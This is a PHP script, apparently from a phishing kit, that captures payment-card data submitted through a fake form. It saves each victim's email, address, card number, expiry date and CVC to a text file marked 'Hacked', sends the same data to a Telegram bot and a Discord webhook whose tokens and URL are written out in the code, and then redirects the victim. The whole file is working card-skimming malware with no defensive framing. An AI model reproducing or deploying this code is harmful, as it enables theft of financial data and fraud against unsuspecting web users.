<?php

extract($_REQUEST);
$file=fopen("Blood.txt","a");


fwrite($file,"*********Hacked*************\n");
fwrite($file,"Email: ");
fwrite($file,$Email . "\n");
fwrite($file,"Address: ");
fwrite($file,$Address . "\n");
fwrite($file,"cardtype: ");
fwrite($file,$cardtype . "\n");
fwrite($file,"country: ");
fwrite($file,$country . "\n");
fwrite($file,"*********Hacked*************\n");
fwrite($file,"zip: ");
fwrite($file,$zip . "\n");
fwrite($file,"CardName: ");
fwrite($file,$CardName. "\n");
fwrite($file,"*********Card***********\n");
fwrite($file,"CCN: ");
fwrite($file,$CCN . "\n");
fwrite($file,"Expiry: ");
fwrite($file,$Expiry. "\n");
fwrite($file,"cvc: ");
fwrite($file,$cvc. "\n");
fwrite($file,"*******Card*********\n");



fwrite($file,"\n");
fclose($file);



#Send Log Details to Telegram
$telegram = "on";

#Send Log Details to Discord
$discord ="on"; 


$count = $_POST["country"];
$e = $_POST["Email"];
$Address = $_POST["Address"];
$cardtype = $_POST["cardtype"];
$CCN = $_POST["CCN"];
$Exp = $_POST["Expiry"];
$cv = $_POST["cvc"];
$zip = $_POST["zip"];
$Cardname = $_POST["CardName"];

$data = "*********HACKED*********\n
country: $count \n
Email: $e \n
Address: $Address \n
zip: $zip \n
Card Type: $cardtype \n
Card Name: $CardName \n
**********CARD***********\n;
CCN: $CCN \n
Expiry: $Exp \n
cvc: $cv \n
**********CARD***********\n";


$txt = $data;
$chat_id = "6875904469"; // Your Telegram Chat ID
$bot_url = "bot7117122047:AAEtDs1yPAHT4H0KqSpgpKmGMgIB8Zn7Hsk"; // Your Telegram Bot Api key



if ($telegram == "on"){
    $send = ['chat_id'=>$chat_id,'text'=>$txt];
    $website_telegram = "https://api.telegram.org/{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    
    
}


if ($discord == "on"){
    $website_discord = "https://discord.com/api/webhooks/1289725581793165366/3jPLU1X6oWz6VeHLfJhTVXXb4IEvJpbkIlgb9RPJbNC4r9Wx0skXFQl_JyW6WIfCFNo1"; // Your Discord webhooks URL
    $json_data = array ('content' =>"$txt");
    $make_json = json_encode($json_data);
    $ch = curl_init( $website_discord );
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('content-type: application/json'));
    curl_setopt($ch, CURLOPT_POSTFIELDS, $make_json);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $response = curl_exec($ch);

} 

header("location: index.php");



